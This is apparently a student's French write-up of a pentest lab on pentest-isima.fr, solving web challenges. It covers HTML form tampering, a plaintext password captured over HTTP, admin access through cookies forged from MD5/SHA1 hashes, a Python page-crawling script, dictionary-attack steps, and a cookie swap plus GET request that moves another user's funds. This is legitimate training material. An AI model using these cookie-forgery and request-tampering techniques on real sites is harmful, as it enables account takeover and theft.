# Site web :
    - nom de domaine : pentest-isima.fr
    - ip :  178.62.12.176

## Accès:
    - ajouter la ligne suivante dans /etc/hosts
`178.62.12.176 pentest-isima.fr`

Devient accessible à partir du navigateur à l'adresse pentest-isima.fr

## Sous domaine:
    - http://pentest-isima.fr/Epreuves_Web/
    - http://pentest-isima.fr/SQLI_101.php
    - http://pentest-isima.fr/SQLI_102.php
    - http://pentest-isima.fr/index.php

### epreuve 1:

Simplement jouer avec le HTML du form

### epreuve 2:

    - admin
    - MAoAfyhGNmk= 
Script qui chiffre à retirer. HTTP => ce que l'on lit usr le reseau est ce qui passe il nous suffit donc d'utiliser ce mot de passe

### epreuve 3:

On souhaite ici devenir administateur et on dispose d'un compte pour cela.

après s'être connecté, une session est crée et on regarde les cookies:
>'user=f4a77acf03e969bbb2b99fee35d137fb; d=0b20cd7f98fde6a0c65a6ff68ffdfb627f32d176; PHPSESSID=njtp7hklo0r916q486jacfksb5'

avec https://www.dcode.fr/identification-chiffrement on recherche le type de chiffrement.

On s'aperçoit que:

- MD5: F4A77ACF03E969BBB2B99FEE35D137FB => 'Franck' 
- SHA1: 0b20cd7f98fde6a0c65a6ff68ffdfb627f32d176 => 'Utilisateur'

On va donc se servir de ces informations pour pouvoir envoyer des cookies personnalisé


#### Fonction JS setcookie:

- document.cookie = "NOM_COOKIE=VALEUR"

MD5: admin => 21232f297a57a5a743894a0e4a801fc3 <br/>
SHA1: admin => d033e22ae348aeb5660fc2140aec35850c4da997<br/>
SHA1: Administrateur =>1d8141b215f74524ddb3a4a21d55cc9c2141bd0c <br/>


### epreuve 4:

Le but est de recherché une clé sur l'une des 200 pages du site.
On remarque que le contenu que change sur chaque page est simplement ce qu'il y a dans la div de class "post". On va donc enregistrer le contenu de la div dans un fichier et voir où est-ce qu'il y aura du contenu.

```python
import requests 
from bs4 import BeautifulSoup

i = 0
f = open("res2.txt", "w")

while i < 200:
    i += 1
    url = "http://pentest-isima.fr/Epreuves_Web/epreuve4/index.php?page="+ str(i)
     # on regarde la nouvelle page
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    div = soup.find_all("div", class_="post")
    f.write(f"page n°{i}\n" + str(div) + "\n")
```

La clé se trouve sur la page 184: 

- `Vous avez trouvez la bonne page. Votre clef est : A2dfT3BBn2e`

### epreuve 5:

Ici on doit réaliser une attaque par dictionnaire.<br/>
Les étapes sont les suivantes:
- Analyser le formulaire, notamment les input et la destination
- Récupérer un dictionnaire
- Envoyer des requetes à la destination avec des mots de passe différents contenue dans notre dictionnaire.
- Si erreur dans la reponse alors on continue, sinon on a trouvé


### index.php

Il y a ici un problème du au formulaire de type get mais aussi au stockage des cookies.

Après connexion avec un on enregistre un numéro de session et un username dans les cookie. Celui-ci est utilisé dans la page transfert.php pour savoir qui donne de l'argent. De cette manière on peut prendre l'argent du compte de n'importe qui en modifiant le cookie

Connexion:
>admin admin-

Changement de cookie:
> document.cookie = "user=alice"

Envoie d'argent:
> http://pentest-isima.fr/transfert.php?username=user&gold=10000

On vient de voler 10000 à alice pour les donner à user.

L'utilisateur n'a d'ailleur pas besoin d'exister
>document.cookie = "username=ghregre" <br/>
>http://pentest-isima.fr/transfert.php?username=user&gold=10000

